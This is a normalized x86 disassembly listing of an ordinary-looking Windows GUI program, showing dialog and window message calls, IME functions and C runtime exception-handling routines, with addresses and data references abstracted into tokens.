mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x24 ] edx
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x25 ] 0x0
je rwxdata
jmp rwxdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov dx [ eax + ecx * 2 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
add ecx [ ebp - 0x10 ]
movzx edx [ ebp - 0x1c ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
jmp rwxdata
mov [ ebp - 0x2c ] 0x0
jmp rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax + 0x1 ]
mov [ ebp - 0x26 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx + 0x1 ]
jne rwxdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne rwxdata
add [ ebp - 0x24 ] 0x2
add [ ebp - 0x20 ] 0x2
cmp [ ebp - 0x26 ] 0x0
jne rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax ]
mov [ ebp - 0x25 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx ]
jne rwxdata
sub_402170
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
lea ecx [ esi + 0x224 ]
push ecx
mov ecx [ esi + 0xc ]
call sub_40aea0
mov [ esi + 0x218 ] eax
pop esi
retn 0x4
sub_403970
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
mov ecx [ rw-data ]
push edx
push eax
call sub_402c80
retn
sub_403990
mov eax [ ecx + 0x214 ]
push 0x0
push sub_403970
push eax
push 0x385
call sub_420d20
add esp 0x10
retn
sub_405950
mov eax [ ecx + 0x250 ]
test eax eax
je r-xdata
mov edx [ ecx + 0x248 ]
mov eax [ ecx + 0x23c ]
movzx eax [ eax + edx * 2 - 0x2 ]
retn
mov ecx [ ecx + 0x244 ]
movzx eax [ ecx + eax * 2 - 0x2 ]
retn
sub_405980
mov al [ ecx + 0x234 ]
test al al
jne r-xdata
push 0x40
call [ MessageBeep@IAT ]
mov eax 0x1
retn
xor eax eax
retn
sub_4066d0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
mov ecx [ rw-data ]
push edx
push eax
call sub_404e50
retn
sub_4066f0
mov eax [ ecx + 0x214 ]
push 0x0
push sub_4066d0
push eax
push 0x38a
call sub_420d20
add esp 0x10
retn
sub_4076e0
mov eax ecx
mov [ eax ] r--data
retn
sub_4076f0
mov eax ecx
mov [ eax ] r--data
retn
sub_407700
mov eax ecx
mov [ eax ] r--data
retn
sub_407710
mov eax ecx
mov [ eax ] r--data
retn
sub_407720
mov eax ecx
mov [ eax ] r--data
retn
sub_407730
mov eax ecx
mov [ eax ] r--data
retn
sub_4081f0
mov ecx rw-data
jmp sub_407740
sub_409650
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
push eax
mov ecx rw-data
call sub_408ca0
retn
sub_4099b0
movzx eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push edx
mov ecx rw-data
call sub_409670
retn 0x10
sub_409f10
mov ecx rw-data
jmp sub_4099d0
sub_40a730
mov edx ecx
push edi
xor eax eax
mov ecx 0x7
mov edi edx
[ edi ]
mov eax [ esp + 0x8 ]
mov [ edx + 0x18 ] eax
mov eax edx
pop edi
retn 0x4
sub_40b420
push 0x0
call sub_40a750
retn
sub_40bad0
cmp [ ecx + 0x20e ] 0x0
mov [ ecx ] 0x0
mov [ ecx + 0x20c ] 0x0
je r-xdata
retn
push 0x1
call sub_40b760
sub_40dd00
mov eax [ ecx + 0x4 ]
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
xor eax eax
retn
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax 0x1
retn
sub_40e930
mov eax [ ecx + 0x4 ]
mov dx [ eax ]
mov eax [ ecx ]
add [ ecx + 0x8 ] dx
mov edx [ eax + 0x8 ]
mov ax [ esp + 0x4 ]
add [ ecx + 0x8 ] ax
mov [ ecx + 0x4 ] edx
call sub_40db00
retn 0x4
sub_40ea70
mov al [ ecx + 0x48 ]
test al al
jne r-xdata
retn
mov [ ecx + 0x48 ] 0x1
jmp sub_40e4b0
sub_410860
mov eax ecx
xor ecx ecx
mov [ eax + 0x6 ] cx
mov [ eax + 0x14 ] cx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x18 ] ecx
retn
sub_410df0
movzx eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push 0x0
push 0x1
push eax
push ecx
push edx
mov ecx rw-data
call sub_4109d0
retn 0x10
sub_413300
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x10 ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x1c ] ecx
retn
sub_413880
push esi
mov esi [ esp + 0x8 ]
mov eax ecx
push edi
mov ecx 0x89
mov edi eax
[ edi ] [ esi ]
pop edi
mov [ eax + 0x18 ] 0x1
pop esi
retn 0x4
sub_413960
sub ecx 0x3021
js r-xdata
or eax 0xffffffff
mov eax ecx
shr eax 0x8
movzx eax al
imul eax eax 0x5e
movzx ecx cl
add eax ecx
cmp eax 0x1932
jle r-xdata
retn
sub_413990
mov edx ecx
mov ecx [ esp + 0x4 ]
call sub_413960
test eax eax
jge r-xdata
mov [ eax + edx ] 0x1
mov eax 0x1
retn 0x4
xor eax eax
retn 0x4
sub_413ad0
mov edx ecx
mov ecx [ esp + 0x4 ]
call sub_413960
test eax eax
jge r-xdata
mov [ eax + edx ] 0x0
mov eax 0x1
retn 0x4
xor eax eax
retn 0x4
sub_413c30
mov ecx [ esp + 0xc ]
mov al [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
push 0x1
push rw-data
push ecx
mov [ rw-data ] al
mov eax [ esp + 0x10 ]
push edx
push eax
call [ TextOutA@IAT ]
retn
sub_413d70
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x18 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] 0xffffffff
mov [ eax + 0x2c ] ecx
retn
sub_4151c0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push 0x0
push 0x406
push ecx
push edx
call [ SendDlgItemMessageA@IAT ]
retn
sub_415e80
mov eax [ esp + 0x4 ]
push esi
push 0x0
push eax
mov esi ecx
call sub_415a70
xor eax eax
mov ax [ esi ]
pop esi
shr eax 0x8
and eax 0x1f
retn 0x4
sub_4162d0
xor eax eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x10 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x1c ] eax
mov [ ecx + 0x18 ] eax
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x28 ] eax
retn
sub_416400
mov eax [ esp + 0x4 ]
movsx ecx [ eax + 0x2 ]
mov edx [ esp + 0x8 ]
movsx eax [ edx + 0x2 ]
sub eax ecx
retn
sub_416480
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
retn
push eax
call sub_429931
add esp 0x4
sub_4164a0
mov eax [ esp + 0x4 ]
push 0x0
push sub_416080
push eax
push 0x3b4
call sub_420d20
add esp 0x10
retn
sub_417ce0
push esi
movsx esi [ ecx + 0x8 ]
mov [ ecx + 0xa ] 0x0
call sub_417a20
mov eax esi
pop esi
retn
sub_419070
cmp [ ecx + 0x20 ] 0xb
jne r-xdata
retn
cmp [ ecx ] 0xffffffff
je r-xdata
push 0xfeff
call sub_401240
sub_4198b0
mov [ ecx ] r--data
mov ecx [ ecx + 0x14 ]
test ecx ecx
je r-xdata
retn
push ecx
call sub_429931
pop ecx
sub_419a30
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
retn
push 0x1
push 0x0
push eax
call [ InvalidateRect@IAT ]
sub_419c20
push esi
mov esi ecx
xor eax eax
push 0x1
mov [ esi + 0x1c ] ax
mov [ esi + 0x1a ] ax
mov [ esi + 0x1e ] ax
call sub_419a50
mov ecx esi
pop esi
jmp sub_419a30
sub_41aa30
push esi
mov esi ecx
call sub_41a150
mov [ esi ] r--data
mov eax [ rw-data ]
push 0x349
push eax
call [ LoadBitmapA@IAT ]
mov [ esi + 0x70 ] eax
mov eax esi
pop esi
retn
j_sub_41aa60
jmp sub_41aa60
sub_41b5c0
mov eax [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x147
push 0x62c
push eax
call [ SendDlgItemMessageA@IAT ]
retn
j_sub_41a9d0
jmp sub_41a9d0
j_sub_4198b0
jmp sub_4198b0
sub_41bed0
push esi
push 0x0
push 0x0
push 0x408
mov esi ecx
mov eax [ esi + 0x40 ]
push 0x642
push eax
call [ SendDlgItemMessageA@IAT ]
mov ecx esi
pop esi
jmp sub_41a180
sub_41cb80
mov edx ecx
push edi
lea edi [ edx + 0x4c ]
mov ecx 0x3c
xor eax eax
[ edi ]
stosw [ edi ]
mov ecx edx
pop edi
jmp sub_41aa10
sub_41d660
push esi
push 0x0
push 0x61a
mov esi ecx
call sub_41a840
mov ecx esi
mov [ esi + 0x3c ] 0x0
call sub_41a180
mov ecx esi
pop esi
jmp sub_41cb80
sub_41ef33
add al [ eax ]
add al [ eax ]
add al [ eax ]
add al [ ecx ]
nop
nop
nop
nop
nop
sub_41f508
nop
nop
nop
nop
nop
nop
nop
nop
sub_41f970
mov ecx [ rw-data ]
jmp sub_41d950
sub_41fc20
mov ecx [ rw-data ]
jmp sub_41ea30
sub_41fd00
mov ecx [ rw-data ]
jmp sub_41ebd0
sub_41fdd0
mov ecx [ rw-data ]
jmp sub_41edd0
sub_41feb0
mov ecx [ rw-data ]
jmp sub_41ef40
sub_41ff80
mov ecx [ rw-data ]
jmp sub_41f040
sub_420060
mov ecx [ rw-data ]
jmp sub_41f240
sub_420140
mov ecx [ rw-data ]
jmp sub_41f510
sub_420240
mov ecx [ rw-data ]
jmp sub_41f760
sub_420320
mov ecx [ rw-data ]
jmp sub_41f980
sub_420490
mov ecx [ ecx ]
xor eax eax
test ecx ecx
je r-xdata
retn
cmp [ ecx ] ax
je r-xdata
lea ecx [ ecx ]
add ecx 0x2
inc eax
cmp [ ecx ] 0x0
jne r-xdata
sub_420620
mov edx ecx
push edi
xor eax eax
mov ecx 0xa
mov edi edx
[ edi ]
mov eax edx
pop edi
retn
sub_420ef0
mov eax [ esp + 0x4 ]
push 0x30
push 0x6
push 0x7
push eax
call sub_420e20
add esp 0x10
retn
sub_4215d0
mov eax [ esp + 0x8 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x4 ]
push eax
push sub_4210c0
push ecx
push edx
call sub_420d20
add esp 0x10
retn
sub_4217f0
mov eax [ esp + 0x4 ]
mov dx [ eax + 0x1c ]
mov [ ecx + 0x1c ] dx
mov dl [ eax + 0x1e ]
mov [ ecx + 0x1e ] dl
mov dl [ eax + 0x1f ]
mov [ ecx + 0x1f ] dl
mov dl [ eax + 0x20 ]
mov [ ecx + 0x20 ] dl
mov al [ eax + 0x21 ]
mov [ ecx + 0x21 ] al
retn 0x4
sub_421ab0
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_4217f0
mov eax [ esi + 0x18 ]
mov edx [ esi + 0x10 ]
push eax
push edx
call sub_421890
pop esi
retn 0x4
sub_4228f0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x400 ] ecx
mov [ eax + 0x404 ] 0x0
retn 0x4
sub_423020
mov eax ecx
mov [ eax + 0x8 ] 0x12c
mov [ eax ] 0x9f6
mov [ eax + 0x4 ] 0xce4
mov ecx [ rw-data ]
mov [ eax + 0x28 ] ecx
mov [ eax + 0x10 ] 0x79e
mov [ eax + 0x14 ] 0x38
mov [ eax + 0x26 ] 0x22
retn
sub_424520
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
retn
push 0x1
push 0x0
push eax
call [ InvalidateRect@IAT ]
sub_424570
mov eax [ ecx ]
test eax eax
je r-xdata
retn
push 0x0
push 0x0
push 0x421
push eax
call [ SendMessageA@IAT ]
sub_4245b0
mov eax [ ecx ]
push 0x0
push 0x0
push 0x41b
push eax
call [ SendMessageA@IAT ]
retn
sub_4245d0
mov eax [ ecx ]
test eax eax
je r-xdata
retn 0x8
movzx ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push ecx
push edx
push 0x401
push eax
call [ SendMessageA@IAT ]
sub_424a00
mov [ ecx ] r--data
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
retn
push ecx
call sub_429931
pop ecx
sub_424a20
mov eax ecx
mov [ eax ] r--data
retn
sub_424a30
mov eax ecx
mov [ eax ] r--data
retn
sub_424a40
mov eax ecx
mov [ eax ] r--data
retn
j_sub_424a00
jmp sub_424a00
sub_424aa0
movzx eax [ ecx + 0x14 ]
cmp eax [ esp + 0x4 ]
je r-xdata
retn 0x4
mov [ ecx + 0x14 ] 0x0
sub_424ac0
mov al [ rw-data ]
test al al
je r-xdata
retn
dec al
mov [ rw-data ] al
sub_424b80
movsx eax [ ecx + 0xc ]
mov edx [ esp + 0x4 ]
dec eax
push eax
mov ecx edx
call sub_424a60
mov [ esp + 0x4 ] eax
mov ecx edx
jmp sub_421980
sub_424ba0
mov eax ecx
mov [ eax ] r--data
retn
sub_424bb0
movsx eax [ ecx + 0xc ]
mov edx [ esp + 0x4 ]
push eax
mov ecx edx
call sub_424a60
mov [ esp + 0x4 ] eax
mov ecx edx
jmp sub_4218f0
sub_424d30
mov eax [ ecx + 0x18 ]
test eax eax
je r-xdata
retn
mov al [ rw-data ]
mov dl al
inc al
test dl dl
mov [ rw-data ] al
jne r-xdata
mov [ ecx + 0x14 ] dl
jmp sub_424cd0
sub_425150
push ecx
mov ecx [ esp + 0x8 ]
call sub_424f10
retn 0x4
sub_4251b0
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
mov [ rw-data ] 0x1
call sub_425050
mov [ rw-data ] 0x0
sub_425210
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
mov ecx [ rw-data ]
push edx
call sub_421e30
retn 0x10
sub_425230
mov ecx rw-data
jmp sub_4039b0
sub_427000
mov al [ ecx + 0x540 ]
test al al
je r-xdata
jmp sub_425e50
mov al [ ecx + 0x3f9 ]
test al al
je r-xdata
retn
ImmAssociateContext
jmp [ ImmAssociateContext@IAT ]
ImmReleaseContext
jmp [ ImmReleaseContext@IAT ]
ImmSetCompositionFontA
jmp [ ImmSetCompositionFontA@IAT ]
ImmSetCompositionWindow
jmp [ ImmSetCompositionWindow@IAT ]
ImmGetContext
jmp [ ImmGetContext@IAT ]
j_sub_429931
jmp sub_429931
sub_429401
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax ] 0xe06d7363
je r-xdata
call sub_42a47e
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x24 ]
retn
sub_429478
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4293d2
sub_4294da
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x18 ]
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4293d2
sub_4296c0
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov [ eax ] ecx
mov ecx [ rw-data ]
mov [ eax + 0x4 ] ecx
mov [ rw-data ] eax
retn
sub_4296d9
mov eax [ rw-data ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ esp + 0x4 ]
je r-xdata
inc eax
retn
xor eax eax
retn
mov eax [ eax + 0x4 ]
sub_42984c
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4298d6
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_42984c
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_429902
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_42991a
push 0x1
push [ esp + 0x8 ]
call sub_429a2a
pop ecx
pop ecx
retn
sub_429928
push 0x19
call sub_42a280
pop ecx
retn
sub_429aea
push [ esp + 0x4 ]
call sub_429a68
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
retn
sub_429d10
retn
sub_429d11
mov eax sub_42c4b8
mov [ rw-data ] eax
mov [ rw-data ] sub_42c17e
mov [ rw-data ] sub_42c1e3
mov [ rw-data ] sub_42c126
mov [ rw-data ] sub_42c1c9
mov [ rw-data ] eax
retn
sub_429d49
call sub_429d11
call sub_42c55b
mov [ rw-data ] eax
call sub_42c509
fnclex
retn
sub_42a444
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x70 ] ecx
push eax
push ecx
call sub_42dcdb
pop ecx
pop ecx
retn
sub_42a458
mov esp [ ebp - 0x18 ]
mov edi [ ebp - 0x70 ]
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_42bca5
or [ ebp - 0x4 ] 0xffffffff
mov eax edi
lea esp [ ebp - 0x7c ]
call sub_42a513
retn
push edi
call sub_42bc85
sub_42a49b
xor eax eax
inc eax
retn
sub_42a4c8
xor eax eax
inc eax
retn
sub_42a513
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
leave
push ecx
retn
sub_42a573
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
and [ rw-data ] 0x0
jmp sub_42a47e
xor eax eax
retn
sub_42a5f9
mov eax [ ebp - 0x14 ]
call sub_42a573
retn
sub_42a639
cmp [ rw-data ] 0x0
jle r-xdata
retn
dec [ rw-data ]
sub_42a67d
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_42a686
mov esp [ ebp - 0x18 ]
jmp sub_42a47e
sub_42a9b1
xor eax eax
inc eax
retn
sub_42a9b5
mov esp [ ebp - 0x18 ]
jmp sub_42a47e
sub_42adac
cmp [ rw-data ] 0x2
jne r-xdata
push 0x3
pop eax
retn
cmp [ rw-data ] 0x5
jb r-xdata
xor eax eax
inc eax
retn
sub_42bc74
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_42bbb2
add esp 0xc
retn
sub_42bc85
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_42bbb2
add esp 0xc
retn
sub_42bc96
push 0x1
push 0x0
push 0x0
call sub_42bbb2
add esp 0xc
retn
sub_42bca5
push 0x1
push 0x1
push 0x0
call sub_42bbb2
add esp 0xc
retn
sub_42bde2
xor eax eax
inc eax
retn
sub_42beb0
xor eax eax
inc eax
retn
sub_42bfe5
xor eax eax
inc eax
retn
sub_42c1c9
mov eax [ esp + 0x4 ]
fld [ eax ]
fcomp [ r--data ]
fnstsw ax
test ah 0x1
jne r-xdata
xor eax eax
retn
xor eax eax
inc eax
retn
sub_42c509
push 0x30000
push 0x10000
call sub_42f6ae
pop ecx
pop ecx
retn
sub_42d45f
xor eax eax
inc eax
retn
sub_42e484
xor eax eax
inc eax
retn
sub_42e4c8
xor eax eax
inc eax
retn
sub_42e5bd
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_42986e
add esp 0x8
pop ebp
retn 0x4
sub_42e61e
push sub_42e5d8
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_42e631
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_42e6c8
push esi
push [ esp + 0xc ]
xor esi esi
push [ esp + 0xc ]
inc esi
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_42e6e4
push esi
push [ esp + 0xc ]
xor esi esi
push [ esp + 0xc ]
inc esi
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_42e700
push esi
push [ esp + 0x8 ]
xor esi esi
inc esi
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_42eb7b
xor eax eax
inc eax
retn
sub_42ee1f
xor eax eax
inc eax
retn
sub_42f00c
xor eax eax
xor eax eax
retn
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ esp + 0x4 ]
cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
xor eax eax
inc eax
retn
sub_42f1f8
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_42f0a0
add esp 0xc
retn
sub_42f20e
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_42f0a0
add esp 0xc
retn
sub_42f553
push 0x2
call sub_42a280
pop ecx
retn
sub_42f6ae
mov eax [ esp + 0x8 ]
and eax 0xfff7ffff
push eax
push [ esp + 0x8 ]
call sub_42f67c
pop ecx
pop ecx
retn
sub_42f948
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
movsx eax [ ecx + eax * 8 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_42fa15
call sub_4311b4
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_431057
sub_42fa8f
push 0x8
push r--data
call sub_42a4d8
and [ ebp - 0x4 ] 0x0
push 0x0
push 0x1
call sub_431213
sub_42fab0
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0x3
call [ ExitProcess@IAT ]
int3
sub_42fac0
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_42fa8f
retn
sub_430005
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_42ffd4
add esp 0xc
retn
sub_4303ec
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_430200
pop ecx
mov [ rw-data ] 0x1
sub_4311b4
push 0x1
call sub_431147
pop ecx
retn
sub_43124e
xor eax eax
inc eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_431bb0
push j_sub_420470
push 0x5
push 0x4
mov eax [ ebp - 0x10 ]
add eax 0xac
push eax
call sub_429430
retn
sub_431bc8
mov eax r--data
jmp sub_42957b
sub_431be0
mov eax [ ebp - 0x10 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431beb
mov eax [ ebp - 0x10 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431bf6
mov eax r--data
jmp sub_42957b
sub_431c00
mov eax [ ebp - 0x10 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431c0b
mov eax r--data
jmp sub_42957b
sub_431c20
push j_sub_420470
push 0x5
push 0x4
mov eax [ ebp - 0x10 ]
add eax 0xac
push eax
call sub_429430
retn
sub_431c38
push j_sub_420470
push 0xc
push 0x4
mov eax [ ebp - 0x10 ]
add eax 0xc0
push eax
call sub_429430
retn
sub_431c50
mov eax r--data
jmp sub_42957b
sub_431c60
mov eax [ ebp + 0x4 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431c6b
mov eax r--data
jmp sub_42957b
sub_431c80
mov eax [ ebp - 0x70 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431c8b
mov eax r--data
jmp sub_42957b
sub_431ca0
push j_sub_420470
push 0x5
push 0x4
mov eax [ ebp - 0x10 ]
add eax 0xac
push eax
call sub_429430
retn
sub_431cb8
push j_sub_420470
push 0xc
push 0x4
mov eax [ ebp - 0x10 ]
add eax 0xc0
push eax
call sub_429430
retn
sub_431cd0
mov eax r--data
jmp sub_42957b
sub_431ce0
mov eax [ ebp + 0x4 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431ceb
mov eax r--data
jmp sub_42957b
sub_431d00
mov eax [ ebp - 0x540 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431d0e
mov eax r--data
jmp sub_42957b
sub_431d20
push j_sub_420470
push 0x5
push 0x4
mov eax [ ebp - 0x854 ]
add eax 0xac
push eax
call sub_429430
retn
sub_431d3b
push j_sub_420470
push 0xc
push 0x4
mov eax [ ebp - 0x854 ]
add eax 0xc0
push eax
call sub_429430
retn
sub_431d56
mov eax r--data
jmp sub_42957b
sub_431d60
mov eax [ ebp - 0x10 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431d6b
mov eax r--data
jmp sub_42957b
sub_431d80
mov eax [ ebp - 0x10 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431d8b
mov eax r--data
jmp sub_42957b
sub_431da0
mov eax [ ebp - 0x10 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431dab
mov eax r--data
jmp sub_42957b
sub_431dc0
push j_sub_420470
push 0xc
push 0x4
mov eax [ ebp - 0x10 ]
add eax 0x28
push eax
call sub_429430
retn
sub_431dd6
mov eax r--data
jmp sub_42957b
sub_431de0
push j_sub_420470
push 0xc
push 0x4
mov eax [ ebp - 0x10 ]
add eax 0x28
push eax
call sub_429430
retn
sub_431df6
push j_sub_420470
push 0x5
push 0x4
mov eax [ ebp - 0x10 ]
add eax 0x58
push eax
call sub_429430
retn
sub_431e0c
mov ecx [ ebp - 0x10 ]
add ecx 0x6c
jmp j_sub_420470
sub_431e17
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp j_sub_420470
sub_431e22
mov ecx [ ebp - 0x10 ]
add ecx 0x74
jmp j_sub_420470
sub_431e2d
mov eax r--data
jmp sub_42957b
sub_431e40
lea ecx [ ebp - 0x98 ]
jmp sub_422850
sub_431e4b
mov eax r--data
jmp sub_42957b
sub_431e60
mov eax [ ebp - 0x414 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431e6e
mov eax [ ebp - 0x414 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431e7c
mov eax [ ebp - 0x414 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431e8a
mov eax r--data
jmp sub_42957b
sub_431ea0
mov eax [ ebp - 0x410 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431eae
mov eax [ ebp - 0x410 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431ebc
mov eax [ ebp - 0x410 ]
push eax
call j_sub_429931
pop ecx
retn
sub_431eca
mov eax r--data
jmp sub_42957b
sub_431ee0
mov ecx rw-data
jmp sub_420620
sub_431ef0
push 0x1f4
mov ecx rw-data
call sub_4024d0
push sub_432030
call sub_429aea
pop ecx
retn
sub_431f10
mov ecx rw-data
jmp sub_420620
sub_431f20
mov ecx rw-data
jmp sub_420620
sub_431f30
push 0x28
mov ecx rw-data
call sub_40a730
push sub_432040
call sub_429aea
pop ecx
retn
sub_431f50
mov ecx rw-data
jmp sub_420620
sub_431f60
push 0x29
mov ecx rw-data
call sub_40a730
push sub_432050
call sub_429aea
pop ecx
retn
sub_431f80
push 0x2a
mov ecx rw-data
call sub_40a730
push sub_432060
call sub_429aea
pop ecx
retn
sub_431fa0
mov ecx rw-data
call sub_410860
push sub_432070
call sub_429aea
pop ecx
retn
sub_431fc0
mov ecx rw-data
jmp sub_4139b0
sub_431fd0
mov ecx rw-data
jmp sub_420620
sub_431fe0
mov ecx rw-data
jmp sub_420620
sub_431ff0
mov ecx rw-data
jmp sub_420620
sub_432000
mov ecx rw-data
jmp sub_417ce0
sub_432010
mov ecx rw-data
jmp sub_423020
sub_432020
mov ecx rw-data
jmp sub_4259e0
sub_432030
mov ecx rw-data
jmp sub_402500
sub_432040
mov ecx rw-data
jmp sub_40b420
sub_432050
mov ecx rw-data
jmp sub_40b420
sub_432060
mov ecx rw-data
jmp sub_40b420
sub_432070
push 0x1
mov ecx rw-data
call sub_410880
retn
